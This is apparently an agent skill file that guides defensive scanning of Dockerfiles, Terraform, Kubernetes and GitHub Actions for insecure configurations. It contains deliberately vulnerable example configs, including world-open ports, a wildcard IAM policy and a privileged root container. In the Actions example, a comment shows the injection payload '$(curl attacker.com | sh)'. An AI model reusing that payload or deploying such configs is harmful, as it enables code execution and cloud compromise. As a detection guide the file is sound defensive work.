---
name: sast-iac
description: >-
  Detect insecure Infrastructure-as-Code (IaC) configurations in a codebase
  using a three-phase approach: recon (inventory IaC files — Dockerfile,
  Terraform, Kubernetes manifests, GitHub Actions workflows, docker-compose),
  batched verify (apply rule-set against 3 files in parallel), and merge
  (consolidate batch results). Requires sast/architecture.md (run sast-analysis
  first). Outputs findings to sast/iac-results.md plus canonical
  sast/iac-results.json. Use when asked to find insecure IaC, container
  misconfigurations, cloud misconfigurations, or pipeline misconfigurations.
version: 0.1.0
---

# Insecure Infrastructure-as-Code Detection

You are hunting for **insecure IaC** — configuration in Dockerfiles, Terraform, Kubernetes manifests, GitHub Actions workflows, and docker-compose files that puts the running system at risk. Unlike application-code bugs, IaC findings rarely need a user-input trace. The misconfiguration itself is the vulnerability: a privileged container, a publicly readable S3 bucket, a security group open to the world, a workflow that checks out an attacker-controlled ref.

**Prerequisites**: sast/architecture.md must exist. Run `sast-analysis` first so you know which IaC surfaces the project actually uses (cloud target, orchestrator, CI platform).

This skill produces two outputs:

- `sast/iac-results.md` — human-readable findings
- `sast/iac-results.json` — canonical machine-readable findings (schema defined in the root CLAUDE.md)

Intermediate files (`sast/iac-recon.md`, `sast/iac-batch-*.md`) may be created during execution and must be cleaned up at the end.

> **Note on tooling overlap**: Dedicated scanners — `tfsec`, `checkov`, `kubesec`, `hadolint`, `actionlint`, `trivy config` — are faster and more exhaustive than a manual review. This skill complements them: it catches project-specific misuse, cross-file patterns (e.g. a workflow that hands secrets to a misconfigured container), and rule gaps those scanners miss. If the repo already runs one of those scanners in CI, cross-check your findings against its output and note which are net-new.

---

## What is Insecure IaC

"Insecure IaC" is any declarative infrastructure configuration that, once applied, exposes the running system to compromise. The bug lives in the config, not in application code. Typical shapes:

- **Privileged containers** — `privileged: true`, `allowPrivilegeEscalation: true`, `--cap-add=ALL`, or bare-metal host access (`hostNetwork`, `hostPID`, `hostPath` mounts) that give a container kernel-level reach.
- **Root users** — Dockerfile without `USER`, Kubernetes pod without `runAsNonRoot: true` / `runAsUser: <non-zero>`. A compromised process runs as root inside the container, which often means root on the node given the right escape.
- **Publicly exposed storage** — `aws_s3_bucket` with `acl = "public-read"` or `public-read-write`, GCS bucket with `allUsers` IAM binding, Azure storage with anonymous blob access. Any data placed there is world-readable.
- **Open security groups / firewalls** — `cidr_blocks = ["0.0.0.0/0"]` on management ports (22, 3389), database ports (3306, 5432, 1433, 27017, 6379), or internal service ports. Also NSG rules with `*` source, K8s Services of type `LoadBalancer` without cloud firewall gating.
- **Secrets in env vars or build args** — `ENV DB_PASSWORD=...` in Dockerfile, `env:` with literal secret in a K8s manifest, `ARG AWS_SECRET_ACCESS_KEY` in a build. These leak into image layers, `docker inspect`, `kubectl describe`, and CI logs.
- **Unfixed image tags** — `FROM node:latest`, `image: postgres:14` (no digest). The image you test is not the image you ship. Tags are mutable; digests are not.
- **Workflows that check out untrusted refs with privileges** — `on: pull_request_target` combined with `actions/checkout@v4` pointing at `github.event.pull_request.head.sha`. The workflow runs with write-scoped `GITHUB_TOKEN` on attacker-controlled code. This is the single most exploited IaC pattern in open source (see `pwn-request`).
- **Overly broad IAM** — `"Action": "*"` / `"Resource": "*"` in an IAM policy, K8s `ClusterRole` with `"*"` verbs, GitHub `permissions: write-all`. A compromised workload becomes a compromised account.
- **Missing defense-in-depth** — no `HEALTHCHECK`, no `readOnlyRootFilesystem`, no resource limits, no `NetworkPolicy`, no `PodSecurity` admission. Individually small; together they mean one bug becomes full lateral movement.

### What Insecure IaC IS

- A declarative statement that weakens the runtime posture (privileged, public, root, open port, broad IAM, mutable tag).
- A CI/CD workflow configuration that grants power to untrusted input (untrusted checkout, unpinned third-party action, script injection via event title/body).
- A missing hardening directive that is project-standard elsewhere (no `USER`, no `securityContext`, no `NetworkPolicy`).

### What Insecure IaC is NOT

- **Runtime bugs in the application itself.** SQLi, XSS, SSRF, path traversal — those live in the app code and belong to their own skills, even if the vulnerable app happens to ship inside a Docker image. IaC scope ends at the config boundary.
- **Hardcoded secrets in application source.** A literal API key inside `app.py` or a bundled JS file is `sast-hardcodedsecrets` territory. However, a secret pasted into a `Dockerfile`, `terraform.tfvars`, a K8s `Secret` manifest checked into git, or a workflow `env:` block IS insecure IaC — note it in `iac-results` and cross-link. Do not double-count: if `sast-hardcodedsecrets` already reported the exact same literal, reference its finding ID rather than duplicating.
- **Dependency CVEs.** A base image with a known-vulnerable package is `sast-deps` scope. A Dockerfile that pins an unpatched base image becomes IaC only if the pin itself is the issue (e.g. no digest, or pinning to a known-EOL tag).
- **Generic code-quality issues.** Missing comments, long files, formatting — out of scope.

### Patterns That Prevent Insecure IaC

A clean IaC surface usually shows these signals. When you see them, downgrade confidence on related findings:

- **Non-root `USER`** in every Dockerfile, ideally a numeric UID so K8s `runAsNonRoot: true` can enforce it.
- **Pinned image digests** — `FROM node:20.11.1@sha256:<hex>` instead of `FROM node:latest`. Digests are immutable; tags lie.
- **`HEALTHCHECK`** declared so the orchestrator can evict broken containers rather than serving traffic from them.
- **Read-only root filesystem** — `readOnlyRootFilesystem: true` with explicit `emptyDir` writable mounts only where needed.
- **`securityContext`** with `runAsNonRoot: true`, `runAsUser: <non-zero>`, `allowPrivilegeEscalation: false`, `capabilities: { drop: ["ALL"] }`, `seccompProfile: { type: RuntimeDefault }`.
- **`NetworkPolicy`** that defaults deny ingress/egress and explicitly allows only required flows.
- **Least-privilege IAM** — scoped `Action` list, scoped `Resource` ARNs, condition keys (`aws:SourceVpc`, `aws:PrincipalOrgID`), short-lived credentials via OIDC instead of long-lived access keys.
- **Private-by-default storage** — S3 buckets with `block_public_acls = true`, `block_public_policy = true`, `ignore_public_acls = true`, `restrict_public_buckets = true`. GCS with uniform bucket-level access.
- **Scoped GitHub token permissions** — top-level `permissions:` block with the minimum set (`contents: read` by default, `pull-requests: write` only on jobs that need it). No `permissions: write-all`.
- **Avoid `pull_request_target` with checkout of untrusted ref.** If `pull_request_target` is required (e.g. for labeling or fork-aware comments), do not check out the PR head, or check it out in a separate unprivileged job that does not touch secrets.
- **Actions pinned to SHA** — `uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1` not `uses: actions/checkout@v4`.

---

## Vulnerable vs. Secure Examples

### Dockerfile

**Vulnerable:**

```dockerfile
FROM node:latest                         # mutable tag; today != tomorrow
ADD https://example.com/bin /usr/local/  # remote fetch, no checksum
COPY . /app                              # pulls in .env, .git, creds
ENV DB_PASSWORD=hunter2                  # baked into every layer
RUN chmod -R 777 /app                    # world-writable files
USER root                                # explicit root (or no USER at all)
CMD ["node", "server.js"]                # no HEALTHCHECK, no tini
```

**Secure:**

```dockerfile
FROM node:20.11.1@sha256:2c3f... AS build
WORKDIR /app
COPY package*.json ./
RUN npm ci --omit=dev
COPY --chown=node:node src ./src

FROM gcr.io/distroless/nodejs20-debian12@sha256:9a8c...
WORKDIR /app
COPY --from=build --chown=nonroot:nonroot /app /app
USER nonroot
HEALTHCHECK --interval=30s --timeout=3s CMD ["/nodejs/bin/node", "healthcheck.js"]
CMD ["server.js"]
```

Secrets come from the orchestrator at runtime, never `ENV`. Use `.dockerignore` to keep `.env`, `.git`, `node_modules`, and local keys out of the build context.

### Terraform (AWS)

**Vulnerable:**

```hcl
resource "aws_s3_bucket" "public" {
  bucket = "my-app-assets"
  acl    = "public-read"                 # world-readable
}

resource "aws_security_group_rule" "ssh" {
  type        = "ingress"
  from_port   = 22
  to_port     = 22
  protocol    = "tcp"
  cidr_blocks = ["0.0.0.0/0"]            # SSH to the internet
}

resource "aws_security_group_rule" "db" {
  from_port   = 5432
  to_port     = 5432
  cidr_blocks = ["0.0.0.0/0"]            # Postgres to the internet
}

resource "aws_db_instance" "main" {
  publicly_accessible = true             # RDS with public IP
  # ...
}

resource "aws_iam_policy" "god" {
  policy = jsonencode({
    Statement = [{
      Effect   = "Allow"
      Action   = "*"
      Resource = "*"
    }]
  })
}
```

**Secure:**

```hcl
resource "aws_s3_bucket" "assets" {
  bucket = "my-app-assets"
}

resource "aws_s3_bucket_public_access_block" "assets" {
  bucket                  = aws_s3_bucket.assets.id
  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}

resource "aws_security_group_rule" "ssh_from_bastion" {
  type                     = "ingress"
  from_port                = 22
  to_port                  = 22
  protocol                 = "tcp"
  source_security_group_id = aws_security_group.bastion.id
}

resource "aws_db_instance" "main" {
  publicly_accessible = false
  db_subnet_group_name = aws_db_subnet_group.private.name
}
```

### Kubernetes

**Vulnerable:**

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: api
spec:
  template:
    spec:
      hostNetwork: true                  # node network namespace
      containers:
        - name: api
          image: myco/api:latest         # mutable tag
          securityContext:
            privileged: true             # full kernel cap
            allowPrivilegeEscalation: true
            runAsUser: 0                 # root
          # no resource limits -> noisy neighbor / DoS
          # no NetworkPolicy in namespace
---
apiVersion: v1
kind: Service
metadata:
  name: api
spec:
  type: LoadBalancer                     # public IP, no firewall
  ports: [{ port: 80, targetPort: 8080 }]
```

**Secure:**

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: api
spec:
  template:
    spec:
      automountServiceAccountToken: false
      containers:
        - name: api
          image: myco/api@sha256:ab12...
          securityContext:
            runAsNonRoot: true
            runAsUser: 10001
            allowPrivilegeEscalation: false
            readOnlyRootFilesystem: true
            capabilities: { drop: ["ALL"] }
            seccompProfile: { type: RuntimeDefault }
          resources:
            requests: { cpu: "100m", memory: "128Mi" }
            limits:   { cpu: "500m", memory: "256Mi" }
---
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: api-default-deny
spec:
  podSelector: { matchLabels: { app: api } }
  policyTypes: [Ingress, Egress]
  ingress:
    - from:
        - podSelector: { matchLabels: { app: gateway } }
      ports: [{ port: 8080 }]
```

### GitHub Actions

**Vulnerable:**

```yaml
name: ci
on:
  pull_request_target:                    # runs with write token on base repo secrets
    types: [opened, synchronize]

permissions: write-all                    # everything writable

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4         # floating tag
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # attacker code
      - uses: some-vendor/deploy@main     # third-party, floating
      - name: greet
        run: echo "Thanks ${{ github.event.pull_request.title }}"
        # title can contain $(curl attacker.com | sh) -> script injection
```

**Secure:**

```yaml
name: ci
on:
  pull_request:                           # runs in fork context, no secrets

permissions:
  contents: read                          # minimum by default

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      pull-requests: write                # elevated only where needed
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
      - uses: some-vendor/deploy@a1b2c3d4e5f6...                         # SHA pin
      - name: greet
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: echo "Thanks $PR_TITLE"      # quoted env var, no interpolation
```

Never interpolate `${{ github.event.* }}` directly into a `run:` block. Pass through `env:` and reference with shell syntax. If `pull_request_target` must be used, split into two jobs: a privileged one that does not check out PR code, and an unprivileged one that does.

---

## Execution

### Phase 1: Recon — Inventory IaC Files

Enumerate every IaC artifact in the repo. Use one `Glob` per family, in parallel:

- `**/Dockerfile`, `**/Dockerfile.*`, `**/*.dockerfile`
- `**/*.tf`, `**/*.tfvars`
- `**/k8s/**/*.y*ml`, `**/kubernetes/**/*.y*ml`, `**/manifests/**/*.y*ml`, `**/helm/**/templates/*.y*ml`, `**/kustomization.y*ml`
- `**/.github/workflows/*.y*ml`, `**/.gitlab-ci.y*ml`, `**/.circleci/config.yml`, `**/azure-pipelines.y*ml`, `**/Jenkinsfile*`
- `**/docker-compose*.y*ml`, `**/compose*.y*ml`
- `**/Pulumi.*.yaml`, `**/cloudformation/**/*.y*ml`, `**/serverless.y*ml`, `**/bicep/*.bicep`

For each hit, note path, IaC family, and role (prod vs dev vs test vs example). Read `sast/architecture.md` for ground truth on which cloud / orchestrator is actually deployed — do not chase a Terraform file that is clearly a leftover experiment.

Write the inventory to `sast/iac-recon.md` as a flat list grouped by family, one row per file. If the project has **zero** IaC files, write `sast/iac-results.md` and `sast/iac-results.json` (with empty `findings: []`) noting that IaC scope does not apply, clean up, and stop.

### Phase 2: Verify — Rule Matching (Batched)

Split the inventory into batches of **3 files each**. Launch one subagent per batch, in parallel. Give each subagent this instruction pattern:

> Read the assigned IaC files and `sast/architecture.md`. For each file, apply the rule-set below (Dockerfile rules / Terraform rules / Kubernetes rules / GitHub Actions rules — pick by file type). For every rule hit, capture: file path, line, rule ID, severity, exact offending snippet, why it is exploitable given the deployment context, and a concrete fix. Write the batch output to `sast/iac-batch-<n>.md`.

**Dockerfile rule-set**: `USER root` or no `USER`; floating tag in `FROM`; `ADD` with URL and no checksum; `COPY .` at root without `.dockerignore`; `ENV` or `ARG` holding a secret-shaped value; `RUN chmod 777` or world-writable paths; missing `HEALTHCHECK`; `apt-get install` without `--no-install-recommends` and `rm -rf /var/lib/apt/lists/*` (image bloat, minor); `curl | sh` pattern.

**Terraform rule-set**: `acl = "public-read"` / `"public-read-write"`; missing `aws_s3_bucket_public_access_block`; `cidr_blocks = ["0.0.0.0/0"]` on ports 22, 3389, 3306, 5432, 1433, 27017, 6379, 9200, or any internal service port; `publicly_accessible = true` on RDS / Redshift / DocumentDB; `"Action": "*"` or `"Resource": "*"` in IAM; missing `kms_key_id` on EBS / RDS / S3 when the org policy requires CMK; security group with unrestricted egress where egress should be scoped; IAM user with `aws_iam_access_key` (prefer roles / OIDC).

**Kubernetes rule-set**: `hostNetwork: true`, `hostPID: true`, `hostIPC: true`; `privileged: true`; `allowPrivilegeEscalation: true` (or missing + no default); `runAsUser: 0` or missing `runAsNonRoot`; no `resources.limits`; no `readOnlyRootFilesystem`; `capabilities.add` including `SYS_ADMIN`, `NET_ADMIN`, `NET_RAW`; `Service` of type `LoadBalancer` / `NodePort` exposing a sensitive port; no `NetworkPolicy` in the namespace; `automountServiceAccountToken: true` (or default) on pods that do not call the API; `hostPath` mounts to `/`, `/var/run/docker.sock`, `/etc`.

**GitHub Actions rule-set**: top-level `permissions: write-all` or missing top-level `permissions`; `on: pull_request_target` combined with `actions/checkout` of `github.event.pull_request.head.*`; third-party action reference without a SHA (floating tag like `@v1` or `@main` is a finding unless pinned by the org's ruleset); `run:` block that interpolates `${{ github.event.issue.title }}`, `.body`, `.head_ref`, `.comment.body`, or `.pull_request.title/body` directly; secrets referenced in a job that also runs untrusted code; self-hosted runner without ephemeral isolation mentioned.

**docker-compose rule-set**: `privileged: true`; `network_mode: host`; bind mounts to `/var/run/docker.sock`; `environment:` block with literal secrets; ports bound to `0.0.0.0` when they should be `127.0.0.1` for dev.

Each batch subagent owns its files end-to-end and must not read files outside its assigned slice.

### Phase 3: Merge — Consolidate Batch Results

Read every `sast/iac-batch-*.md`. Merge into a single `sast/iac-results.md` using the `## Findings` template below. De-duplicate: if the same rule fires across multiple near-identical files (e.g. ten K8s deployments all missing `resources.limits`), collapse into one finding whose `location` points at the first occurrence and whose description lists all affected paths.

Also emit `sast/iac-results.json` per the canonical schema. `severity` levels for IaC:

- **critical** — direct path to RCE, data exposure, or account takeover with no prerequisite (e.g. `pull_request_target` + untrusted checkout + secrets, public S3 bucket with PII, `privileged: true` on a public-facing pod).
- **high** — exploitable with one additional condition (e.g. open SSH to world, root container, `"Action": "*"` policy, RDS publicly accessible).
- **medium** — meaningful posture degradation (no `readOnlyRootFilesystem`, no `NetworkPolicy`, floating image tag, `permissions: write-all` on workflows that do not handle untrusted input).
- **low** — defense-in-depth gap (missing `HEALTHCHECK`, missing resource limits, apt cache not cleaned).
- **info** — notable but not actionable alone.

After writing results, delete `sast/iac-recon.md` and all `sast/iac-batch-*.md` files.

### False-positive handling

- **Dev-only manifests.** A `docker-compose.dev.yml` with `ports: 0.0.0.0:5432:5432` or a `k8s/dev/` deployment without a `NetworkPolicy` is not a production exposure. Flag the finding but **downgrade severity by one level** and mark `environment: dev` in the notes. If the file is clearly local-only (e.g. `Tiltfile`, `skaffold.dev.yaml`, `compose.local.yml`), flag as `info`.
- **Intentional public assets with CDN.** A public S3 bucket fronting CloudFront for static assets is fine when: (a) the bucket holds only public content, (b) upload is controlled, (c) there is an `aws_s3_bucket_public_access_block` that still restricts ACLs but a bucket policy grants OAI/OAC read. Do not flag as critical — note as `info` with the CDN wiring called out.
- **Example / template repos.** Files under `examples/`, `samples/`, `demo/` that are documented as intentionally insecure teaching material: drop to `info` with a note.
- **Commented-out config.** A YAML key inside a `#` block is not live. Ignore unless it is about to be uncommented (recent git activity).

Do not silently drop findings. Every downgrade must appear in the finding notes with the reason.

---

## Findings

Write the merged output to `sast/iac-results.md` using this template:

```markdown
# Insecure IaC — Findings

_Scanned N IaC files across Dockerfile, Terraform, Kubernetes, GitHub Actions, docker-compose._

## Summary

| Severity | Count |
|----------|-------|
| Critical | N |
| High     | N |
| Medium   | N |
| Low      | N |
| Info     | N |

## Findings

### [IAC-001] <short title>

- **Severity**: critical | high | medium | low | info
- **File**: `path/to/file.tf:42`
- **Rule**: TF-SG-OPEN-22
- **Category**: Terraform / network exposure

**Offending snippet**

```hcl
resource "aws_security_group_rule" "ssh" {
  type        = "ingress"
  from_port   = 22
  to_port     = 22
  cidr_blocks = ["0.0.0.0/0"]
}
```

**Why it matters**

SSH is exposed to the public internet. Combined with any weak credential, leaked key, or outdated sshd, this is a direct path to host compromise. The security group applies to `aws_instance.bastion` (per `main.tf:87`) which has a public IP and holds an IAM instance profile with `ec2:*` permissions.

**Fix**

Restrict `cidr_blocks` to the corporate VPN CIDR, or replace with AWS SSM Session Manager (removes the need for inbound SSH entirely). Example:

```hcl
cidr_blocks = [var.admin_vpn_cidr]
```

**Notes**

Cross-reference: the companion Terraform at `terraform/prod/bastion.tf` has the same pattern — collapsed into this finding. FP check: not dev — module is `terraform/prod/`.

---

### [IAC-002] ...
```

Also write `sast/iac-results.json`:

```json
{
  "findings": [
    {
      "id": "iac-001",
      "skill": "sast-iac",
      "severity": "high",
      "title": "Security group allows SSH from 0.0.0.0/0",
      "description": "aws_security_group_rule.ssh opens port 22 to the public internet on a bastion with an IAM instance profile holding ec2:*. One weak credential or stolen key yields full EC2 control.",
      "location": { "file": "terraform/prod/network.tf", "line": 42, "column": 3 },
      "remediation": "Restrict cidr_blocks to the corporate VPN CIDR, or migrate to AWS SSM Session Manager and remove the ingress rule entirely."
    }
  ]
}
```

If no findings, still write both files with an empty `findings` array and an explanatory note in the markdown (`_No insecure IaC detected across N files. Note: dedicated scanners (tfsec, checkov, kubesec, hadolint, actionlint) should still be run in CI — they cover more rules than this skill._`).

---

## Important Reminders

- You are reading configuration, not tracing user input. Do not over-engineer exploitability arguments — for IaC, the config itself is usually sufficient evidence.
- Always cross-check against `sast/architecture.md`. A "publicly accessible RDS" in a repo that never actually deploys RDS is noise.
- When you find a rule hit, look for its mitigating counterpart nearby (`aws_s3_bucket_public_access_block` for a bucket, `NetworkPolicy` for a deployment, `permissions:` block for a workflow). Presence of the mitigation downgrades or eliminates the finding.
- If you find hardcoded secrets in IaC files, note them here AND check whether `sast-hardcodedsecrets` already covered them. Link, don't duplicate.
- Recommend running `tfsec`, `checkov`, `kubesec`, `hadolint`, and `actionlint` in CI. This skill is a complement, not a replacement.
